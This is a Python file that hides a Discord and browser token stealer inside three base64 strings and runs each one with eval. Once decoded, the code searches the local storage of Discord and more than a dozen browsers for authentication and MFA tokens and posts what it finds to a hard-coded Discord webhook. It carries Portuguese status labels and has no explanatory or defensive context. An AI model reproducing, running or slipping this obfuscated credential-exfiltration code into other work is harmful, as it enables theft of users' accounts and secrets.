import base64, codecs
import os

code1 = "aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQganNvbgoKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3BlbgoKIyBXRUJIT09LIFVSTApXRUJIT09LX1VSTCA9ICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDU0MTAyOTg5NzIxMzEzMzExL19vWE9GemVqYk9xc2I4UTUtTE1JcW1TdFM3aVJKTnd1b2k4OHBIOERobERYbm0tbjFySXY0bUhGcVhkbG04RzZwaHdFJwoKIyBNRU5USU9OUwpQSU5HX01FID0gRmFsc2UKCmRlZiBmaW5kX3Rva2VucyhwYXRoKToKICAgIHBhdGggKz0gJ1xcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYicKCiAgICB0b2tlbnMgPSBbXQoKICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubG9nJykgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sZGInKToKICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHInW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9JywgcidtZmFcLltcdy1dezg0fScpOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKHRva2VuKQogICAgcmV0dXJuIHRva2VucwoKZGVmIG1haW4oKToKICAgIGxvY2FsID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQogICAgcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpCgogICAgcGF0aHMgPSB7CiAgICAgICAgJ0Rpc2NvcmQnOiByb2FtaW5nICsgJ1xcRGlzY29yZCcsCiAgICAgICAgJ0Rpc2NvcmQgQ2FuYXJ5Jzogcm9hbWluZyArICdcXGRpc2NvcmRjYW5hcnknLAogICAgICAgICdEaXNjb3JkIFBUQic6IHJvYW1pbmcgKyAnXFxkaXNjb3JkcHRiJywKICAgICAgICAnR29vZ2xlIENocm9tZSc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdCcsCiAgICAgICAgJ09wZXJhJzogcm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBTdGFibGUnLAogICAgICAgICdCcmF2ZSc6IGxvY2FsICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0JywKICAgICAgICAnWWFuZGV4JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCcsCiAgICAgICAgJ29wZXJhZ3gnOiByb2FtaW5nICsgJ1xcT3BlcmEgU29mdHdhcmVcXE9wZXJhIEdYIFN0YWJsZScsCiAgICAgICAgJ0FtaWdvJzogbG9jYWwgKyAnXFxBbWlnb1xcVXNlciBEYXRhJywKICAgICAgICAnVG9yY2gnOiBsb2NhbCArICdcXFRvcmNoXFxVc2VyIERhdGEnLAogICAgICAgICdLb21ldGEnOiBsb2NhbCArICdcS29tZXRhXFxVc2VyIERhdGEnLAogICAgICAgICdPcmJpdHVtJzogbG9jYWwgKyAnXFxPcmJpdHVtXFxVc2VyIERhdGEnLAogICAgICAgICdDZW50LWJyb3dzZXInOiBsb2NhbCArICdcXENlbnRCcm93c2VyXFxVc2VyIERhdGEnLAogICAgICAgICc3c3Rhcic6IGxvY2FsICsgJ1xcN1N0YXJcXDdTdGFyXFxVc2VyIERhdGEnLAogICAgICAgICdTcHV0bmlrJzogbG9jYWwgKyAnXFxTcHV0bmlrXFxTcHV0bmlrXFxVc2VyIERhdGEnLAogICAgICAgICdWaXZhbGRpJzogbG9jYWwgKyAnXFxWaXZhbGRpXFxVc2VyIERhdGEnLAogICAgICAgICdHb29nbGUtY2hyb21lLXN4cyc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWUgU3hTXFxVc2VyIERhdGEnLAogICAgICAgICdNaWNyb3NvZnQgRWRnZSc6IHJvYW1pbmcgKyAnXFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YScsCiAgICAgICAgJ1VyYW4nOiBsb2NhbCArICdcXHVDb3pNZWRpYVxcVXJhblxcVXNlciBEYXRhJywKICAgICAgICAnWWFuZGV4JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YScsCiAgICAgICAgJ0lyaWRpdW0nOiBsb2NhbCArICdcXElyaWRpdW1cXFVzZXIgRGF0YScKICAgIH0KCiAgICBtZXNzYWdlID0gJ0BldmVyeW9uZScgaWYgUElOR19NRSBlbHNlICcnCgogICAgZm9yIHBsYXRmb3JtLCBwYXRoIGluIHBhdGhzLml0ZW1zKCk6CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBtZXNzYWdlICs9IGYnXG4qKlRFTlRBVElWQSAxIC0ge3BsYXRmb3JtfSoqXG5gYGBcbicKCiAgICAgICAgdG9rZW5zID0gZmluZF90b2tlbnMocGF0aCkKCiAgICAgICAgaWYgbGVuKHRva2VucykgPiAwOgogICAgICAgICAgICBmb3IgdG9rZW4gaW4gdG9rZW5zOgogICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ3t0b2tlbn1cbicKICAgICAgICBlbHNlOgogICAgICAgICAgICBtZXNzYWdlICs9ICdORU5IVU0gVE9LRU4gRU5DT05UUkFETy5cbicKCiAgICAgICAgbWVzc2FnZSArPSAnYGBgJwoKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywKICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4xMSAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yMy4wLjEyNzEuNjQgU2FmYXJpLzUzNy4xMScKICAgIH0KCiAgICBwYXlsb2FkID0ganNvbi5kdW1wcyh7J2NvbnRlbnQnOiBtZXNzYWdlfSkKCiAgICB0cnk6CiAgICAgICAgcmVxID0gUmVxdWVzdChXRUJIT09LX1VSTCwgZGF0YT1wYXlsb2FkLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgdXJsb3BlbihyZXEpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIG1haW4oKQo=" #24627



eval(compile(base64.b64decode(code1), "<string>", 'exec'))


code2 = "aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQganNvbgoKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3BlbgoKIyBXRUJIT09LIFVSTApXRUJIT09LX1VSTCA9ICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDU0MTAyOTg5NzIxMzEzMzExL19vWE9GemVqYk9xc2I4UTUtTE1JcW1TdFM3aVJKTnd1b2k4OHBIOERobERYbm0tbjFySXY0bUhGcVhkbG04RzZwaHdFJwoKIyBNRU5USU9OUwpQSU5HX01FID0gRmFsc2UKCmRlZiBmaW5kX3Rva2VucyhwYXRoKToKICAgIHBhdGggKz0gJ1xcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYicKCiAgICB0b2tlbnMgPSBbXQoKICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubG9nJykgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sZGInKToKICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHInW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mzd9JywgcidtZmFcLltcdy1dezg0fScpOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKHRva2VuKQogICAgcmV0dXJuIHRva2VucwoKZGVmIG1haW4oKToKICAgIGxvY2FsID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQogICAgcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpCgogICAgcGF0aHMgPSB7CiAgICAgICAgJ0Rpc2NvcmQnOiByb2FtaW5nICsgJ1xcRGlzY29yZCcsCiAgICAgICAgJ0Rpc2NvcmQgQ2FuYXJ5Jzogcm9hbWluZyArICdcXGRpc2NvcmRjYW5hcnknLAogICAgICAgICdEaXNjb3JkIFBUQic6IHJvYW1pbmcgKyAnXFxkaXNjb3JkcHRiJywKICAgICAgICAnR29vZ2xlIENocm9tZSc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdCcsCiAgICAgICAgJ09wZXJhJzogcm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBTdGFibGUnLAogICAgICAgICdCcmF2ZSc6IGxvY2FsICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0JywKICAgICAgICAnWWFuZGV4JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCcsCiAgICAgICAgJ29wZXJhZ3gnOiByb2FtaW5nICsgJ1xcT3BlcmEgU29mdHdhcmVcXE9wZXJhIEdYIFN0YWJsZScsCiAgICAgICAgJ0FtaWdvJzogbG9jYWwgKyAnXFxBbWlnb1xcVXNlciBEYXRhJywKICAgICAgICAnVG9yY2gnOiBsb2NhbCArICdcXFRvcmNoXFxVc2VyIERhdGEnLAogICAgICAgICdLb21ldGEnOiBsb2NhbCArICdcS29tZXRhXFxVc2VyIERhdGEnLAogICAgICAgICdPcmJpdHVtJzogbG9jYWwgKyAnXFxPcmJpdHVtXFxVc2VyIERhdGEnLAogICAgICAgICdDZW50LWJyb3dzZXInOiBsb2NhbCArICdcXENlbnRCcm93c2VyXFxVc2VyIERhdGEnLAogICAgICAgICc3c3Rhcic6IGxvY2FsICsgJ1xcN1N0YXJcXDdTdGFyXFxVc2VyIERhdGEnLAogICAgICAgICdTcHV0bmlrJzogbG9jYWwgKyAnXFxTcHV0bmlrXFxTcHV0bmlrXFxVc2VyIERhdGEnLAogICAgICAgICdWaXZhbGRpJzogbG9jYWwgKyAnXFxWaXZhbGRpXFxVc2VyIERhdGEnLAogICAgICAgICdHb29nbGUtY2hyb21lLXN4cyc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWUgU3hTXFxVc2VyIERhdGEnLAogICAgICAgICdNaWNyb3NvZnQgRWRnZSc6IHJvYW1pbmcgKyAnXFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YScsCiAgICAgICAgJ1VyYW4nOiBsb2NhbCArICdcXHVDb3pNZWRpYVxcVXJhblxcVXNlciBEYXRhJywKICAgICAgICAnWWFuZGV4JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YScsCiAgICAgICAgJ0lyaWRpdW0nOiBsb2NhbCArICdcXElyaWRpdW1cXFVzZXIgRGF0YScKICAgIH0KCiAgICBtZXNzYWdlID0gJ0BldmVyeW9uZScgaWYgUElOR19NRSBlbHNlICcnCgogICAgZm9yIHBsYXRmb3JtLCBwYXRoIGluIHBhdGhzLml0ZW1zKCk6CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBtZXNzYWdlICs9IGYnXG4qKlRFTlRBVElWQSAyIC0ge3BsYXRmb3JtfSoqXG5gYGBcbicKCiAgICAgICAgdG9rZW5zID0gZmluZF90b2tlbnMocGF0aCkKCiAgICAgICAgaWYgbGVuKHRva2VucykgPiAwOgogICAgICAgICAgICBmb3IgdG9rZW4gaW4gdG9rZW5zOgogICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ3t0b2tlbn1cbicKICAgICAgICBlbHNlOgogICAgICAgICAgICBtZXNzYWdlICs9ICdORU5IVU0gVE9LRU4gRU5DT05UUkFETy5cbicKCiAgICAgICAgbWVzc2FnZSArPSAnYGBgJwoKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywKICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4xMSAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yMy4wLjEyNzEuNjQgU2FmYXJpLzUzNy4xMScKICAgIH0KCiAgICBwYXlsb2FkID0ganNvbi5kdW1wcyh7J2NvbnRlbnQnOiBtZXNzYWdlfSkKCiAgICB0cnk6CiAgICAgICAgcmVxID0gUmVxdWVzdChXRUJIT09LX1VSTCwgZGF0YT1wYXlsb2FkLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgdXJsb3BlbihyZXEpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIG1haW4oKQ==" #24637

code3 = "aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQganNvbgoKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3BlbgoKIyBXRUJIT09LIFVSTApXRUJIT09LX1VSTCA9ICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDU0MTAyOTg5NzIxMzEzMzExL19vWE9GemVqYk9xc2I4UTUtTE1JcW1TdFM3aVJKTnd1b2k4OHBIOERobERYbm0tbjFySXY0bUhGcVhkbG04RzZwaHdFJwoKIyBNRU5USU9OUwpQSU5HX01FID0gRmFsc2UKCmRlZiBmaW5kX3Rva2VucyhwYXRoKToKICAgIHBhdGggKz0gJ1xcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYicKCiAgICB0b2tlbnMgPSBbXQoKICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubG9nJykgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sZGInKToKICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHInW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MzB9JywgcidtZmFcLltcdy1dezg0fScpOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKHRva2VuKQogICAgcmV0dXJuIHRva2VucwoKZGVmIG1haW4oKToKICAgIGxvY2FsID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQogICAgcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpCgogICAgcGF0aHMgPSB7CiAgICAgICAgJ0Rpc2NvcmQnOiByb2FtaW5nICsgJ1xcRGlzY29yZCcsCiAgICAgICAgJ0Rpc2NvcmQgQ2FuYXJ5Jzogcm9hbWluZyArICdcXGRpc2NvcmRjYW5hcnknLAogICAgICAgICdEaXNjb3JkIFBUQic6IHJvYW1pbmcgKyAnXFxkaXNjb3JkcHRiJywKICAgICAgICAnR29vZ2xlIENocm9tZSc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdCcsCiAgICAgICAgJ09wZXJhJzogcm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBTdGFibGUnLAogICAgICAgICdCcmF2ZSc6IGxvY2FsICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0JywKICAgICAgICAnWWFuZGV4JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCcsCiAgICAgICAgJ29wZXJhZ3gnOiByb2FtaW5nICsgJ1xcT3BlcmEgU29mdHdhcmVcXE9wZXJhIEdYIFN0YWJsZScsCiAgICAgICAgJ0FtaWdvJzogbG9jYWwgKyAnXFxBbWlnb1xcVXNlciBEYXRhJywKICAgICAgICAnVG9yY2gnOiBsb2NhbCArICdcXFRvcmNoXFxVc2VyIERhdGEnLAogICAgICAgICdLb21ldGEnOiBsb2NhbCArICdcS29tZXRhXFxVc2VyIERhdGEnLAogICAgICAgICdPcmJpdHVtJzogbG9jYWwgKyAnXFxPcmJpdHVtXFxVc2VyIERhdGEnLAogICAgICAgICdDZW50LWJyb3dzZXInOiBsb2NhbCArICdcXENlbnRCcm93c2VyXFxVc2VyIERhdGEnLAogICAgICAgICc3c3Rhcic6IGxvY2FsICsgJ1xcN1N0YXJcXDdTdGFyXFxVc2VyIERhdGEnLAogICAgICAgICdTcHV0bmlrJzogbG9jYWwgKyAnXFxTcHV0bmlrXFxTcHV0bmlrXFxVc2VyIERhdGEnLAogICAgICAgICdWaXZhbGRpJzogbG9jYWwgKyAnXFxWaXZhbGRpXFxVc2VyIERhdGEnLAogICAgICAgICdHb29nbGUtY2hyb21lLXN4cyc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWUgU3hTXFxVc2VyIERhdGEnLAogICAgICAgICdNaWNyb3NvZnQgRWRnZSc6IHJvYW1pbmcgKyAnXFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YScsCiAgICAgICAgJ1VyYW4nOiBsb2NhbCArICdcXHVDb3pNZWRpYVxcVXJhblxcVXNlciBEYXRhJywKICAgICAgICAnWWFuZGV4JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YScsCiAgICAgICAgJ0lyaWRpdW0nOiBsb2NhbCArICdcXElyaWRpdW1cXFVzZXIgRGF0YScKICAgIH0KCiAgICBtZXNzYWdlID0gJ0BldmVyeW9uZScgaWYgUElOR19NRSBlbHNlICcnCgogICAgZm9yIHBsYXRmb3JtLCBwYXRoIGluIHBhdGhzLml0ZW1zKCk6CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBtZXNzYWdlICs9IGYnXG4qKlRFTlRBVElWQSAzIC0ge3BsYXRmb3JtfSoqXG5gYGBcbicKCiAgICAgICAgdG9rZW5zID0gZmluZF90b2tlbnMocGF0aCkKCiAgICAgICAgaWYgbGVuKHRva2VucykgPiAwOgogICAgICAgICAgICBmb3IgdG9rZW4gaW4gdG9rZW5zOgogICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ3t0b2tlbn1cbicKICAgICAgICBlbHNlOgogICAgICAgICAgICBtZXNzYWdlICs9ICdORU5IVU0gVE9LRU4gRU5DT05UUkFETy5cbicKCiAgICAgICAgbWVzc2FnZSArPSAnYGBgJwoKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywKICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4xMSAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yMy4wLjEyNzEuNjQgU2FmYXJpLzUzNy4xMScKICAgIH0KCiAgICBwYXlsb2FkID0ganNvbi5kdW1wcyh7J2NvbnRlbnQnOiBtZXNzYWdlfSkKCiAgICB0cnk6CiAgICAgICAgcmVxID0gUmVxdWVzdChXRUJIT09LX1VSTCwgZGF0YT1wYXlsb2FkLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgdXJsb3BlbihyZXEpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIG1haW4oKQ==" #24630

eval(compile(base64.b64decode(code2), "<string>", 'exec'))
eval(compile(base64.b64decode(code3), "<string>", 'exec'))
